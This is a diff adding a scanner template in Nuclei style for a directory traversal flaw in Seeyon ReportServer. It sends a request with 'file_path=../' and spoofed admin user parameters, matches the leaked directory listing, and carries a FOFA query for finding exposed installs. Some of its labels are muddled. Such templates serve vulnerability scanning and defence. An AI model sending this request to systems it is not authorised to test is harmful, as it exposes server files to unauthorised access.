@@ -1,0 +1,33 @@
+id: Seeyou-ReportServer-Directory-Shipping
+
+info:
+  name: Seeyou ReportServer Directory Shipping
+  author: cr
+  severity: high
+  description: TP5-Arbitrary-file-read
+  reference:
+    - https://github.com/coldrainh
+  tags: Seeyou,ReportServer-Directory Shipping
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true'
+
+    headers:
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      Pragma: no-cache
+      Cache-Control: no-cache
+      
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "../seeyon"
+        part: body
+
+      - type: status
+        status:
+          - 200
+#fofa-query:title="致远A8-V5协同管理软件 V6.1sp1"
